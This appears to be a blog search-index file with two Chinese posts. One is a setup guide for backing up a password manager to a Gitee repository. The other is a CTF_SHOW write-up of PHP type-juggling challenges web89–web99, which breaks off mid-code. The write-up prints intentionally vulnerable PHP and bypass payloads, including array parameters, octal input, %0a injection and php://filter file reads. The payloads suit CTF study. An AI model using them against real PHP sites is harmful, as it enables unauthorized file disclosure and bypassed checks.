<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>nuxoria 配置自定义仓库</title>
    <link href="/posts/c77f9970/"/>
    <url>/posts/c77f9970/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="欢迎使用Nuxoria"><a href="#欢迎使用Nuxoria" class="headerlink" title="欢迎使用Nuxoria"></a>欢迎使用Nuxoria</h2><p>本文介绍 密码管理器-Nuxoria 如何配置 数据备份和恢复的仓库。</p><h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><p>1.自动备份默认关闭，需要你正确配置备份仓库后才能开启自动备份。</p><p>2.开启自动备份后，新建记录、删除记录都会<strong>实时</strong>更新云端数据，因此会卡那么一下下，如果觉得很难受，可以关闭自动更新，而改为手动更新。</p><p>3.程序只处理了部分异常情况，其他异常都是直接抛出，比如你的设备没有网络，可能会抛出非常奇怪的、看不懂的异常，这个时候就需要自己解决问题了，如果你找不到原因，麻烦联系我。</p><h3 id="非常重要的事情"><a href="#非常重要的事情" class="headerlink" title="非常重要的事情"></a>非常重要的事情</h3><p>可以参考一下程序的密码存储设计</p><p><img src="https://fastly.jsdelivr.net/gh/Honexz/typora_image/image-20240316223708207.png" alt="image-20240316223708207"></p><p>图中的salt值是在初次使用程序时随机生成的，不同的使用者、使用环境都会产生新的salt值，数据的加密存储使用到了这个随机值，因此拥有<strong>主密码</strong>并不足以解密数据，还需要<strong>salt值</strong>，因此，只需要保存好salt值、主密码(安全问题)、数据文件就可以恢复数据，三者丢失其一数据不可恢复，注意注意。</p><h3 id="配置仓库"><a href="#配置仓库" class="headerlink" title="配置仓库"></a>配置仓库</h3><h4 id="注册-x2F-登录-gitee-码云"><a href="#注册-x2F-登录-gitee-码云" class="headerlink" title="注册/登录 gitee(码云)"></a>注册/登录 gitee(码云)</h4><p>1.首先我们需要一个码云账户，如果没有码云账户，那么需要注册一个,地址：<a href="https://gitee.com/signup">点这里</a></p><img src="https://fastly.jsdelivr.net/gh/Honexz/typora_image/image-20240316230045679.png" alt="image-20240316230045679" style="zoom:67%;"><p>注册后登录，不需要实名。</p><p>2.新建仓库</p><p>在右上角找到(+)，然后选择<strong>新建仓库</strong>。</p><p><img src="https://fastly.jsdelivr.net/gh/Honexz/typora_image/image-20240316230943946.png" alt="image-20240316230943946"></p><p>3.填写相关</p><ul><li>设置仓库名，输入一个任意的你想要新建的仓库名称。</li><li>选择开源/私有。</li><li>设置模板，选择Readme文件。</li><li>设置分支，可以选择单分支模型。</li></ul><img src="https://fastly.jsdelivr.net/gh/Honexz/typora_image/image-20240316231554708.png" alt="image-20240316231554708" style="zoom:80%;"><p>5.获取私密令牌</p><p>在 <strong>设置-安全设置-私人令牌</strong> 里创建私人令牌。</p><p><img src="https://fastly.jsdelivr.net/gh/Honexz/typora_image/image-20240316232236509.png" alt="image-20240316232236509"></p><p>设置令牌的描述文字，选择令牌的权限-projects，私人令牌只显示一次，记得保存好。</p><p><img src="https://fastly.jsdelivr.net/gh/Honexz/typora_image/image-20240316232528948.png" alt="image-20240316232528948"></p><p>6.在Noxoria保存配置</p><p>打开Noxoria，进入界面后，在 <strong>设置-备份设置</strong> 中设置备份仓库。</p><p>需要三个参数：</p><p>用户名：gitee的个人空间地址名，一般为设置的用户名。</p><p><img src="https://fastly.jsdelivr.net/gh/Honexz/typora_image/image-20240316234302872.png" alt="image-20240316234302872"></p><p>仓库名：刚才新建仓库时设置的仓库名。</p><p>私人令牌：填写我们刚才获取的私人令牌。</p><p>7.保存配置</p><p>保存配置后，如果配置正确，会提示<strong>参数正确，配置已保持</strong>，那么配置备份仓库就完成了，数据备份和恢复功能就可以使用了。</p><p><img src="https://fastly.jsdelivr.net/gh/Honexz/typora_image/image-20240316234701059.png" alt="image-20240316234701059"></p><p>如果不正确，会有一定的提示，根据提示判断下错误的位置：</p><p>下面的例子是用户名少了字符，但是也有特殊情况无法判断，比如你的用户名为：aabbcc,码云存在一个aabbc的用户，你们都有一个名为data的仓库，如果输错用户名，则会提示令牌不正确或无权限。</p><p><img src="https://fastly.jsdelivr.net/gh/Honexz/typora_image/image-20240316235054970.png" alt="image-20240316235054970"></p><p>如图所示，我在演示时，nuxoria误打成noxoria 了🤣~~</p>]]></content>
    
    
    <categories>
      
      <category>计算机和网络技能</category>
      
    </categories>
    
    
    <tags>
      
      <tag>nuxoria</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP特性</title>
    <link href="/posts/44659fec/"/>
    <url>/posts/44659fec/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="CTF-SHOW"><a href="#CTF-SHOW" class="headerlink" title="CTF_SHOW"></a>CTF_SHOW</h2><p>题目来自于CTF_SHOW的 web入门</p><h3 id="WEB89"><a href="#WEB89" class="headerlink" title="WEB89"></a>WEB89</h3><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span>(<span class="hljs-string">"flag.php"</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'num'</span>])){<br>    <span class="hljs-variable">$num</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'num'</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">"/[0-9]/"</span>, <span class="hljs-variable">$num</span>)){<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">"no no no!"</span>);<br>    }<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>)){<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    }<br>} <br></code></pre></td></tr></tbody></table></figure><p>preg_match当检测的变量是数组的时候会报错并返回0。而intval函数当传入的变量也是数组的时候，会返回1</p><p>PY:</p><figure class="highlight dart"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dart">?<span class="hljs-built_in">num</span>[]=<br></code></pre></td></tr></tbody></table></figure><h3 id="WEB90"><a href="#WEB90" class="headerlink" title="WEB90"></a>WEB90</h3><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span>(<span class="hljs-string">"flag.php"</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'num'</span>])){<br>    <span class="hljs-variable">$num</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'num'</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$num</span>===<span class="hljs-string">"4476"</span>){<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">"no no no!"</span>);<br>    }<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>,<span class="hljs-number">0</span>)===<span class="hljs-number">4476</span>){<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    }<span class="hljs-keyword">else</span>{<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>,<span class="hljs-number">0</span>);<br>    }<br>} <br></code></pre></td></tr></tbody></table></figure><ul><li><p>int intval( $var, $base )<br>参数</p><figure class="highlight gams"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-meta"><span class="hljs-keyword">$var</span>：需要转换成 integer 的「变量」</span><br><span class="hljs-meta"><span class="hljs-keyword">$base</span>：转换所使用的「进制」</span><br></code></pre></td></tr></tbody></table></figure><p>返回值为 integer 类型，可能是 0 或 1 或 其他integer 值。</p><p>0：失败 或 空array 返回 0<br>1：非空array 返回 1<br>其他integer值：成功时 返回 $var 的 integer 值。</p><p>intval() 转换数组类型时，不关心数组中的内容，只判断数组中有没有元素。空数组」返回 0,非空数组」返回 1.</p><p>intval() 转换字符串类型时，会判断字符串是否以数字开头</p><ul><li>如果以数字开头，就返回1个或多个连续的数字</li><li>如果以字母开头，就返回0</li></ul><p>单双引号对转换结果没有影响，并且 0 或 0x 开头也只会当做普通<a href="https://so.csdn.net/so/search?q=%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%A4%84%E7%90%86&amp;spm=1001.2101.3001.7020">字符串处理</a>。</p></li></ul><p>PY:</p><figure class="highlight dart"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dart">intval($<span class="hljs-keyword">var</span>,$<span class="hljs-keyword">base</span>)，其中<span class="hljs-keyword">var</span>必填，<span class="hljs-keyword">base</span>可选，这里<span class="hljs-keyword">base</span>=<span class="hljs-number">0</span>,则表示根据<span class="hljs-keyword">var</span>开始的数字决定使用的进制： <span class="hljs-number">0</span>x或<span class="hljs-number">0</span>X开头使用十六进制，<span class="hljs-number">0</span>开头使用八进制，否则使用十进制。 这里===表示类型和数值必须相等，我们可以使用<span class="hljs-number">4476</span>的八进制或十六进制绕过检测。 <br>paylod：<br><span class="hljs-built_in">num</span>=<span class="hljs-number">010574</span>或<span class="hljs-built_in">num</span>=<span class="hljs-number">0x117c</span>或<span class="hljs-built_in">num</span>=<span class="hljs-number">4476</span>a或<span class="hljs-built_in">num</span>=+<span class="hljs-number">4476</span><br></code></pre></td></tr></tbody></table></figure><h3 id="WEB91"><a href="#WEB91" class="headerlink" title="WEB91"></a>WEB91</h3><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">'flag.php'</span>);<br><span class="hljs-variable">$a</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'cmd'</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">'/^php$/im'</span>, <span class="hljs-variable">$a</span>)){<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">'/^php$/i'</span>, <span class="hljs-variable">$a</span>)){<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">'hacker'</span>;<br>    }<br>    <span class="hljs-keyword">else</span>{<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    }<br>}<br><span class="hljs-keyword">else</span>{<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">'nonononono'</span>;<br>}<br></code></pre></td></tr></tbody></table></figure><ul><li>使用了 <code>^</code>（表示匹配字符串的开头）和 <code>$</code>（表示匹配字符串的结尾）来限定匹配整个字符串为 “php”。</li><li><code>i</code> 标志表示不区分大小写匹配。</li><li><code>m</code> 标志表示多行模式，让 <code>^</code> 和 <code>$</code> 可以匹配字符串的每一行的开头和结尾。</li></ul><p>PY:</p><p>利用 %0a 使参数为两行，php 在第二行既处于开头又处于结尾，第二个正则将第一行和第二行一起匹配，这时php处于结尾而不处于开头</p><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">cmd</span>=%0aphp<br>?<span class="hljs-attribute">cmd</span>=php%0a1<br></code></pre></td></tr></tbody></table></figure><h3 id="WEB92"><a href="#WEB92" class="headerlink" title="WEB92"></a>WEB92</h3><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span>(<span class="hljs-string">"flag.php"</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'num'</span>])){<br>    <span class="hljs-variable">$num</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'num'</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$num</span>==<span class="hljs-number">4476</span>){<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">"no no no!"</span>);<br>    }<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>,<span class="hljs-number">0</span>)==<span class="hljs-number">4476</span>){<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    }<span class="hljs-keyword">else</span>{<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>,<span class="hljs-number">0</span>);<br>    }<br>}<br></code></pre></td></tr></tbody></table></figure><p>进制绕过：</p><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">num</span>=0x117c<br></code></pre></td></tr></tbody></table></figure><p>intval()函数如果$base为0则$var中存在字母的话遇到字母就停止读取 但是e这个字母比较特殊，可以在PHP中不是科学计数法。所以为了绕过前面的==4476我们就可以构造 4476e1</p><p>在弱类型比较的时候，4476e1是科学计数法4476*10^1，而在intval函数中，遇到字母就停止读取，因此是4476，成功绕过，非常巧妙。</p><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">num</span>=4476e1<br></code></pre></td></tr></tbody></table></figure><h3 id="WEB93"><a href="#WEB93" class="headerlink" title="WEB93"></a>WEB93</h3><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span>(<span class="hljs-string">"flag.php"</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'num'</span>])){<br>    <span class="hljs-variable">$num</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'num'</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$num</span>==<span class="hljs-number">4476</span>){<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">"no no no!"</span>);<br>    }<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">"/[a-z]/i"</span>, <span class="hljs-variable">$num</span>)){<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">"no no no!"</span>);<br>    }<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>,<span class="hljs-number">0</span>)==<span class="hljs-number">4476</span>){<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    }<span class="hljs-keyword">else</span>{<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>,<span class="hljs-number">0</span>);<br>    }<br>}<br></code></pre></td></tr></tbody></table></figure><p>进制绕过，但是过滤了字母。因此可以使用8进制来绕过：</p><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">num</span>=010574<br></code></pre></td></tr></tbody></table></figure><h3 id="WEB94"><a href="#WEB94" class="headerlink" title="WEB94"></a>WEB94</h3><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span>(<span class="hljs-string">"flag.php"</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'num'</span>])){<br>    <span class="hljs-variable">$num</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'num'</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$num</span>===<span class="hljs-string">"4476"</span>){<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">"no no no!"</span>);<br>    }<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">"/[a-z]/i"</span>, <span class="hljs-variable">$num</span>)){<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">"no no no!"</span>);<br>    }<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$num</span>, <span class="hljs-string">"0"</span>)){<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">"no no no!"</span>);<br>    }   <span class="hljs-comment"># strpos($num, "0")：这是 strpos() 函数的调用，用于检查字符串变量 $num 是否包含子字符串 "0"。</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>,<span class="hljs-number">0</span>)===<span class="hljs-number">4476</span>){<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    }<br>}<br></code></pre></td></tr></tbody></table></figure><p>必须可以找到0但是不能在首位，而且不能有字母，因此进制绕过不行。<br>我想的是拿特殊字符：</p><figure class="highlight apache"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">4476</span>,<span class="hljs-number">0</span><br></code></pre></td></tr></tbody></table></figure><p>除了逗号，其他的字符基本都可以。看了一下hint：</p><pre><code class="hljs">在93的基础上过滤了开头为0的数字 这样的话就不能使用进制转换来进行操作 我们可以使用小数点来进行操作。这样通过intval()函数就可以变为int类型的4476 ?num=4476.0</code></pre><p>注意；</p><p>这里何web93有区别，在第一次和参数对比时，web93是弱等于，web94是强等于</p><h3 id="WEB95"><a href="#WEB95" class="headerlink" title="WEB95"></a>WEB95</h3><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span>(<span class="hljs-string">"flag.php"</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'num'</span>])){<br>    <span class="hljs-variable">$num</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'num'</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$num</span>==<span class="hljs-number">4476</span>){<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">"no no no!"</span>);<br>    }<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">"/[a-z]|\./i"</span>, <span class="hljs-variable">$num</span>)){<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">"no no no!!"</span>);<br>    }<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$num</span>, <span class="hljs-string">"0"</span>)){<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">"no no no!!!"</span>);<br>    }<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>,<span class="hljs-number">0</span>)===<span class="hljs-number">4476</span>){<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    }<br>}<br></code></pre></td></tr></tbody></table></figure><p>利用八进制，但是前面需要加一个空格。在url中，空格可以使用+和%20代替。发现%0a，%0d也可以绕过</p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">?num= <span class="hljs-number">010574</span><br>?num=+<span class="hljs-number">010574</span><br>?num=%<span class="hljs-number">0</span>a010574<br></code></pre></td></tr></tbody></table></figure><p>如果没有前面的特殊字符，那么会卡在代码的第十一行，也就是strpos函数，测试发现，没有加特殊字符，变量会被当作一个整型来处理，就不会包含字符0，加上特殊字符就会被当作字符串处理，自然就会匹配到字符0</p><h3 id="WEB96"><a href="#WEB96" class="headerlink" title="WEB96"></a>WEB96</h3><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'u'</span>])){<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'u'</span>]==<span class="hljs-string">'flag.php'</span>){<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">"no no no"</span>);<br>    }<span class="hljs-keyword">else</span>{<br>        <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'u'</span>]);<br>    }<br>} <br></code></pre></td></tr></tbody></table></figure><p>PY:在linux下面表示当前目录是 ./ 所以我们的payload： u=./flag.php</p><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">?u=<span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>flag.php<br>?u=./flag.php<br>?u=php:<span class="hljs-regexp">//</span>filter/resource=flag.php<br></code></pre></td></tr></tbody></table></figure><h3 id="WEB97"><a href="#WEB97" class="headerlink" title="WEB97"></a>WEB97</h3><p>PHP-md5</p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'a'</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'b'</span>])) {<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'a'</span>] != <span class="hljs-variable">$_POST</span>[<span class="hljs-string">'b'</span>])<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'a'</span>]) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'b'</span>]))<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br><span class="hljs-keyword">else</span><br><span class="hljs-keyword">print</span> <span class="hljs-string">'Wrong.'</span>;<br>}<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></tbody></table></figure><p>参考文章：<a href="https://www.cnblogs.com/ainsliaea/p/15126218.html">PHP md5相等绕过</a></p><p>在 PHP5 和 PHP7 中，当两个 md5 进行比较时，若参数是不同的数组，那么 <code>==</code> 和 <code>===</code> 比较的结果均为 True</p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// /param.php?a[]=1&amp;b[]=2</span><br><span class="hljs-title function_ invoke__">print_r</span>(PHP_VERSION . <span class="hljs-string">"&lt;br&gt;"</span>);<br><br><span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">"a"</span>];<br><span class="hljs-variable">$b</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">"b"</span>];<br><br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$a</span> . <span class="hljs-string">"&lt;br&gt;"</span>);<br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$b</span> . <span class="hljs-string">"&lt;br&gt;"</span>);<br><br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a</span>) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$b</span>)));<br></code></pre></td></tr></tbody></table></figure><h3 id="WEB98"><a href="#WEB98" class="headerlink" title="WEB98"></a>WEB98</h3><figure class="highlight ruby"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-keyword">include</span>(<span class="hljs-string">"flag.php"</span>);<br>$_GET?<span class="hljs-variable">$_GET</span>=&amp;<span class="hljs-variable">$_POST</span><span class="hljs-symbol">:<span class="hljs-string">'flag'</span></span>;<br><span class="hljs-variable">$_GET</span>[<span class="hljs-string">'flag'</span>]==<span class="hljs-string">'flag'</span><span class="hljs-string">?$</span>_GET=&amp;<span class="hljs-variable">$_COOKIE</span><span class="hljs-symbol">:<span class="hljs-string">'flag'</span></span>;<br><span class="hljs-variable">$_GET</span>[<span class="hljs-string">'flag'</span>]==<span class="hljs-string">'flag'</span><span class="hljs-string">?$</span>_GET=&amp;<span class="hljs-variable">$_SERVER</span><span class="hljs-symbol">:<span class="hljs-string">'flag'</span></span>;<br>highlight_file(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'HTTP_FLAG'</span>]==<span class="hljs-string">'flag'</span><span class="hljs-string">?$</span><span class="hljs-symbol">flag:</span><span class="hljs-variable constant_">__FILE__</span>);<br><br><span class="hljs-meta prompt_">?&gt;</span> <br></code></pre></td></tr></tbody></table></figure><p>参考：<a href="https://www.cnblogs.com/IFS-/p/17178643.html">文章</a></p><h3 id="WEB99"><a href="#WEB99" class="headerlink" title="WEB99"></a>WEB99</h3><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">highlight_file</span>(<span 